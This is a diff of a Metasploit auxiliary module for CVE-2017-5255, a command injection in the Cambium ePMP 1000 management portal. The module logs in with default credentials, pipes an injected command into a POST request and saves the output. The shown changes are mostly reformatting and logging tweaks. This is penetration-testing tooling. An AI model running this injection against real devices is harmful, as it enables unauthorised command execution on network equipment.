@@ -7,25 +7,30 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::EPMP
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => "Cambium ePMP 1000 'get_chart' Command Injection (v3.1-3.5-RC7)",
-      'Description' => %{
+    super(
+      update_info(
+        info,
+        'Name' => "Cambium ePMP 1000 'get_chart' Command Injection (v3.1-3.5-RC7)",
+        'Description' => %q{
           This module exploits an OS Command Injection vulnerability in Cambium
           ePMP 1000 (v3.1-3.5-RC7) device management portal. It requires any one of the
           following login credentials - admin/admin, installer/installer, home/home - to
           execute arbitrary system commands.
-      },
-      'Author' =>
-        [
+        },
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'References' =>
-        [
+        'References' => [
           ['CVE', '2017-5255'],
           ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']
         ],
-      'License' => MSF_LICENSE
-     )
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
     )
 
     register_options(
@@ -52,7 +57,7 @@ class MetasploitModule < Msf::Auxiliary
     inject = '|' + "#{command}"
     clean_inject = CGI.unescapeHTML(inject.to_s)
 
-    print_status("#{rhost}:#{rport} - Executing #{command}")
+    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Executing #{command}")
     res = send_request_cgi(
       {
         'method' => 'POST',
@@ -81,9 +86,9 @@ class MetasploitModule < Msf::Auxiliary
 
     if good_response
       path = store_loot('ePMP_cmd_exec', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 Command Exec Results')
-      print_status("#{rhost}:#{rport} - Results saved in: #{path}")
+      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Results saved in: #{path}")
     else
-      print_error("#{rhost}:#{rport} - Failed to execute command(s).")
+      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Failed to execute command(s).")
     end
   end
 
